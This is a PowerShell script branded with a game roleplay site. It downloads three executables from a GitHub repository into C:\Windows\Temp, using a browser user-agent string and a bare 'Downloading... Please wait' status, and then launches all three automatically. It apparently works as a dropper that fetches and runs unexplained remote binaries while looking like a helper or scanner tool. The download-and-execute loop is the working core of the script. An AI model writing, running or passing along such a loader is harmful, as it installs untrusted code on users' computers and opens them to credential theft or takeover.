# Header
Write-Host "Need help? Check our homepage: " -NoNewline
Write-Host "majestic-rp.ru" -ForegroundColor Green

$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

function Show-Status {
    param ([string]$Line1 = "Downloading...", [string]$Line2 = "    Please wait")
    $width = $Host.UI.RawUI.WindowSize.Width
    if ($width -lt 1) { $width = 80 }
    $l1 = $Line1.PadRight($width)
    $l2 = $Line2.PadRight($width)
    Write-Host "`r$l1" -BackgroundColor Blue -ForegroundColor White -NoNewline
    Write-Host ""
    Write-Host "$l2" -BackgroundColor Blue -ForegroundColor White -NoNewline
    Write-Host ""
}

$totalFiles = $downloads.Count
$fileIndex = 0

foreach ($item in $downloads) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $req = [System.Net.HttpWebRequest]::Create($item.URL)
        $req.AllowAutoRedirect = $true
        $req.UserAgent = "Mozilla/5.0"
        $response = $req.GetResponse()
        $totalBytes = $response.ContentLength
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($item.Path)
        $buffer = New-Object byte[] 8192
        $bytesRead = 0
        $totalRead = 0

        Show-Status

        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $bytesRead)
            $totalRead += $bytesRead
        }

        $fileStream.Close()
        $stream.Close()
        $response.Close()
        $fileIndex++
    }
    catch {
        Write-Host "`nОшибка: $($_.Exception.Message)" -ForegroundColor Red
    }
}

Show-Status "Downloading..." "    Please wait"
Write-Host "`n"

foreach ($item in $downloads) {
    Start-Process $item.Path
}
